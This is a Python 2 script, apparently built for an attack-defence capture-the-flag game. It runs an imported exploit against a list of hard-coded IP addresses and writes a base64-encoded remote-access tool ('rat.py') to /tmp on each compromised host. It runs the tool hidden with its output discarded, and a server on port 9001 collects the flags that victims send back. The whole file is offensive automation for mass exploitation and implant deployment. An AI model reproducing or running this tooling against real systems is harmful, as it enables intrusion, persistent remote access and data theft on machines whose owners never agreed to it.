#coding:utf-8
from exp import *
import base64
from multiprocessing import Process
from suber import *
import threading
from sqltools import *
import os
import time






port = 9999
targets=["202.112.51.152",\
"202.112.51.151",\
"127.0.0.1",
# "202.112.51.152",\
]
tarlist=[]

def encodefile(filename):
    ufile = open(filename,"r")
    whole = ufile.read()
    # return whole.encode("base64","strict")
    return base64.b64encode(whole)



# k = encodefile("./rat.py")
# print k
# print k.decode("base64","strict")


def upload(src,target):
    # cmd = "echo "+encodefile("./rat.py")+" > /tmp/ratb64"
    cmd = '''\
python -c '
import base64
res = base64.b64decode("{content}")
f=open("{target}","w")
f.write(res)
'\
'''.format(content = encodefile(src),target=target)

    print cmd
    sel(cmd)


def run(target):
    sel("python {target} 1>/dev/null 2>/dev/null".format(target=target))

# def decodefile

# raw_input()



def scan():
    for target in targets:
        try:
            exploit(target,port)
            sel("ls")
            print raw_r()
            # print raw_r()
            print raw_r()

            upload("./rat.py","/tmp/xxme.py")
            run("/tmp/xxme.py")


            clsconnection()
            updatedb("./our.db",target,"expsucceed","none")

            # shell()

        except:
            log.warn("fail at %s"%target)
            updatedb("./our.db",target,"expfail","none")


# global p


# def monitor():

    

def initdb(name):
    try:
        os.remove(name)
    except:
        pass

    conn = sqlite3.connect(name)
    cursor = conn.cursor()
    cursor.execute('create table awd (ip varchar(20), status varchar(20), flag varchar(40))')
    # cursor.execute('insert into user (ip, state,flag) values ("123.123.123.11", "init","{fadsfasdfj}")')
    cursor.close()
    conn.commit()
    conn.close()




#["ip","exp status","flag","rat status"]
def init_target_list(targets):
    target_list_structure = []
    for target in targets:
        target_list_structure.append([target,"init","none"])
    return target_list_structure



class Handler_ckx(StreamRequestHandler):
    def handle(self):
        addr = self.request.getpeername()
        # print 'pid:',os.getpid()  #当前线程id
        # print 'connection:', addr
        ip=addr[0]
        try:
            idx=targets.index(ip)
            # print idx
            flag=self.request.recv(100)
            updatedb("./our.db",ip,"get",flag)
            
            # tarlist[idx][1]="get"
            # tarlist[idx][2]=flag
            # print 'flag is %s '% flag
            # print tarlist
        except:
            pass

        # submit(flag,TOKEN)
        # sleep(10)  #处理函数写在这里
        # print os.getpid(),' is end.....'




# arg1=123



def recv_server():
    tarlist[0][1]="ggg"
    IP="" #为空不限制IP
    PORT=9001
    TOKEN="i_am_ckxckxckx"
    MAXWORKERS=100  #最大进程数量
    #实例化服务类对象
    server = Server(
        server_address=(IP,PORT),     # address
        RequestHandlerClass=Handler_ckx             # 请求类
    )
    server.allow_reuse_address=True
    server.max_children =MAXWORKERS     #这个很重要，默认max_children为40，根据性能需求设置
    #开启服务
    server.serve_forever()
    server.server_close()
    



p_scan=Process(target=scan,args=())
p_recv=Process(target=recv_server,args=())



# init our database
initdb("./our.db")
tarlist=init_target_list(targets)
for i in tarlist:
    insertdb("./our.db",i[0],i[1],i[2])



lookup("./our.db")
# raw_input()


print "start listening...."



p_scan.start()
raw_input()
p_recv.start()
sleep(1)
while 1:
    print "\n"*9
    try:
        lookup("./our.db")
    except:
        print "tarlist is null"
    sleep(1)
print "main"







